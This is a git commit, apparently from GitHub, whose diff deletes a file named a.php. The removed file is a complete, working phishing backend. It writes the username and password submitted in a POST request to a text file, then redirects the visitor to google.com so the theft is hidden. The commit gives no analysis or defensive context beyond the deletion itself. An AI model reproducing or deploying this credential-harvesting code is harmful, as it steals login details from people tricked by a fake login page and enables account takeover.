4fdbf5a74c114d145cf4f6c913ef61ffca1b8fe3
4ld0-N3wB13 <47210523+4ld0-N3wB13@users.noreply.github.com>
2020-05-04 06:44:32 +0800

    Delete a.php

--- a.php
+++
@@ -1,9 +0,0 @@
-<?php
-$username = $_POST['username'];
-$password = $_POST['password'];
-$fp = fopen('abc.txt','a');
-fwrite ($fp, $username);
-fwrite ($fp, $password);
-fclose($fp);
-header("Location: https://www.google.com");
-?>
